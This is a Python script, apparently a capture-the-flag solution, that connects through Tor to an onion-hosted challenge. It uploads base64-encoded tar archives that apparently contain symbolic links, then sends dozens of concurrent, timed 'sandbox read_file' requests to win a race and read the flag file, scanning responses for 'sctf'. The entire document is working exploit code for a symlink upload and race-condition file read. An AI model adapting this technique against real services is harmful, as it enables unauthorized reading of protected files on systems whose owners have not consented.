import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import concurrent.futures
import base64
import urllib.parse

TOR_PROXY = 'socks5h://127.0.0.1:9050'
ONION_BASE = 'http://2zo4u6agf52klaylsf2ytqyvf7ev4r4kpdhhdxvods3c6owbaobfazid.onion/'

with open('flag_link.tar', 'rb') as f:
    tar_bytes = f.read()
    flag_tar64 = base64.b64encode(tar_bytes).decode('utf-8')
    flag_tar64 = urllib.parse.quote_plus(flag_tar64)

print(f"{ONION_BASE}upload?tar={flag_tar64}")

async def async_requests_example():
    print("=== Method 1: AsyncIO + aiohttp (via Tor) ===")

    urls = [
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=1",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=2",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=3",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=4",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=5",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=6",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}upload?tar={flag_tar64}",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=1",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=2",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=3",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=4",
        f"{ONION_BASE}sandbox?method=read_file&args=link&delay=5",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        f"{ONION_BASE}sandbox?method=read_file&args=link",
        
    ]

    async def fetch(session, url):
        start_time = time.time()
        try:
            if 'delay' in url:
                delay = int(url.split('delay=')[1])
                await asyncio.sleep(delay / 1000)
            async with session.get(url, timeout=30) as response:
                data = await response.json()
                end_time = time.time()
                return {
                    'url': url[:70] if len(url) > 70 else url,
                    'status': response.status,
                    'data': str(data)[:100] if len(str(data)) > 1000 else data,
                    'time': end_time - start_time
                }
        except Exception as e:
            end_time = time.time()
            return {
                'url': url,
                'error': str(e),
                'time': end_time - start_time
            }

    connector = ProxyConnector.from_url('socks5://127.0.0.1:9050')
    start_total = time.time()
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [fetch(session, url) for url in urls]
        results = await asyncio.gather(*tasks)
    end_total = time.time()

    print(f"Total time: {end_total - start_total:.2f}s")
    for i, result in enumerate(results, 1):
        print(f"Request {i}: {result}")
        if 'sctf' in str(result):
            print('\n'* 20)
            print(f"Request {i}: {result}")

    return results

def upload_tar(tarfile):
    with open(tarfile, 'rb') as f:
        tar_bytes = f.read()
        tar64 = base64.b64encode(tar_bytes).decode('utf-8')
    url = f"{ONION_BASE}upload"
    session = requests.Session()
    session.proxies = {
        'http': TOR_PROXY,
        'https': TOR_PROXY,
    }
    response = session.get(url, params={'tar': tar64}, timeout=60)
    print(f"Upload '{tarfile}' response: {response.status_code} - {response.text[:100]}")

def upload_users_link():
    upload_tar('users_link.tar')

def upload_flag_link():
    upload_tar('flag_link.tar')

upload_users_link()
for i in range(20):
    upload_users_link()
    
    asyncio.run(async_requests_example())
# upload_flag_link()